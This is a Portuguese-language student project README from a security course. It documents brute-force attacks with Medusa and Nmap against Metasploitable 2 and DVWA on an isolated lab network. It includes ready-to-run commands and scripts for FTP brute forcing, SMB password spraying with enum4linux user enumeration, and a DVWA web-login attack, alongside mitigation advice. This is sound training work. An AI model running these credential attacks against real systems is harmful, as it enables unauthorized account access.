# Projeto de Segurança: Ataques de Força Bruta com Kali Linux e Medusa

## Introdução
Este projeto foi desenvolvido como parte do curso de Segurança da Informação da DIO, com o objetivo de explorar técnicas de ataques de força bruta em ambientes controlados, utilizando **Kali Linux**, **Medusa** e **Metasploitable 2**. O foco é aprender sobre segurança ofensiva e práticas de mitigação.

## Configuração do Ambiente

### Ferramentas Utilizadas
- **VirtualBox**: Versão 7.0
- **Kali Linux**: Versão 2025.1
- **Metasploitable 2**: Ambiente vulnerável para testes

### Configuração da Rede
- **Tipo de Rede**: Host-Only (`192.168.56.0/24`)
- **Passos**:
  1. Instalação do VirtualBox e criação da rede host-only.
  2. Configuração das VMs Kali Linux e Metasploitable 2.
  3. Verificação de conectividade com o comando:
     ```bash
     ping 192.168.56.101
     ```

## Configuração e Testes

### 1. Criação de Wordlists
Para os testes, criamos wordlists simples manualmente. Em cenários reais, recomenda-se usar wordlists mais robustas disponíveis na internet.

- **Usuários** (`users.txt`):
  ```bash
  echo -e "admin\nadministrador\nuser\nmsfadmin\nguest" > users.txt
  ```
- **Senhas** (`passwords.txt`):
  ```bash
  echo -e "password\nadmin\n123456\n12345678\nwelcome\nwelcome123\nmsfadmin\nqwerty123" > passwords.txt
  ```
- **Verificação**:
  ```bash
  less users.txt
  less passwords.txt
  ```
- **Observação**: O `\n` é usado para quebra de linha. Essas wordlists serão utilizadas em todos os testes.

### 2. Escaneamento de Portas com Nmap
Antes dos ataques, usamos o **Nmap** para listar portas abertas e versões dos serviços no Metasploitable 2:
```bash
nmap -sV -p 21,22,139,443,445,80,8080 192.168.56.101
```
- **Observação**: O Nmap suporta vários parâmetros, como faixas de portas e IPs, permitindo exploração detalhada.

### 3. Realização dos Ataques

#### Ataque 1: Servidor FTP
- **Comando**:
  ```bash
  medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 6
  ```
- **Descrição**: Tentativa de força bruta no serviço FTP com 6 threads (`-t 6`) para maior eficiência.
- **Resultado**: Credenciais válidas (ex.: `msfadmin:msfadmin`).
- **Captura de Tela**: `/images/screenshot_ftp_success.png`.

#### Ataque 2: Servidor SMB
- **Enumeração de Usuários**:
  ```bash
  enum4linux -U 192.168.56.101 > users.txt
  ```
  - Este comando enumera usuários SMB, que podem ser usados para atualizar a wordlist `users.txt`.
- **Ataque com Medusa**:
  ```bash
  medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
  ```
- **Descrição**: Password spraying com a senha comum `password` para todos os usuários.
- **Resultado**: Credenciais válidas (ex.: `msfadmin:password`).
- **Captura de Tela**: `/images/screenshot_smb_enum.png`.

#### Ataque 3: DVWA (Formulário Web)
- **Comando**:
  ```bash
  medusa -h 192.168.56.101 -u admin -P passwords.txt -M http -m DIR:/dvwa -m FORM:login.php -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login"
  ```
- **Descrição**: Ataque de força bruta no formulário de login do DVWA. O formulário HTML deve ser inspecionado para ajustar os parâmetros (`username`, `password`, botão `Login`).
- **Resultado**: Credenciais válidas (ex.: `admin:password`).
- **Captura de Tela**: `/images/screenshot_dvwa_login.png`.
- **Observação**: Consulte o código-fonte do formulário para garantir que os parâmetros estejam corretos.

## Medidas de Mitigação
- **Senhas Fortes**: Use senhas com 12+ caracteres, combinando letras, números e símbolos.
- **Limitação de Tentativas**: Configure bloqueio após 3-5 tentativas falhas (ex.: Fail2Ban).
- **Firewall**: Restrinja portas desnecessárias (ex.: `iptables -A INPUT -p tcp --dport 21 -j DROP`).
- **Protocolos Seguros**: Substitua FTP por SFTP e desative contas SMB padrão.
- **Monitoramento**: Use sistemas de detecção de intrusão (ex.: Snort).
- **Atualizações**: Mantenha sistemas e serviços atualizados.

## Estrutura do Repositório
```
meu-projeto-seguranca/
├── README.md
├── wordlists/
│   ├── users.txt
│   ├── passwords.txt
├── scripts/
│   ├── ftp_bruteforce.sh
│   ├── smb_spray.sh
│   ├── dvwa_bruteforce.sh
├── images/
│   ├── screenshot_ftp_success.png
│   ├── screenshot_smb_enum.png
│   ├── screenshot_dvwa_login.png
```

### Scripts
- `ftp_bruteforce.sh`:
  ```bash
  #!/bin/bash
  medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 6
  ```
- `smb_spray.sh`:
  ```bash
  #!/bin/bash
  enum4linux -U 192.168.56.101 > wordlists/users.txt
  medusa -h 192.168.56.101 -U wordlists/users.txt -p password -M smbnt
  ```
- `dvwa_bruteforce.sh`:
  ```bash
  #!/bin/bash
  medusa -h 192.168.56.101 -u admin -P wordlists/passwords.txt -M http -m DIR:/dvwa -m FORM:login.php -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login"
  ```

Torne os scripts executáveis:
```bash
chmod +x scripts/*.sh
```

## Como Executar
1. Clone o repositório:
   ```bash
   git clone https://github.com/SEU_USUARIO/meu-projeto-seguranca.git
   ```
2. Configure as VMs (Kali Linux e Metasploitable 2) conforme descrito.
3. Execute os scripts em `/scripts/` ou os comandos listados.

## Lições Aprendidas
- A importância de wordlists bem elaboradas para ataques de força bruta.
- A necessidade de configurar ambientes de teste isolados (rede host-only).
- A relevância de inspecionar formulários HTML para ataques web.
- A importância de práticas de segurança para proteger sistemas reais.

## Referências
- Kali Linux: https://www.kali.org/
- Metasploitable 2: https://sourceforge.net/projects/metasploitable/
- Medusa: http://foofus.net/goons/jmk/medusa/medusa.html
- DVWA: https://github.com/digininja/DVWA
- Nmap: https://nmap.org/
- Enum4linux: https://github.com/CiscoCXSecurity/enum4linux

## Autor
- **Nome**: [Seu Nome]
- **Data**: 17 de Outubro de 2025
- **Curso**: DIO - Segurança da Informação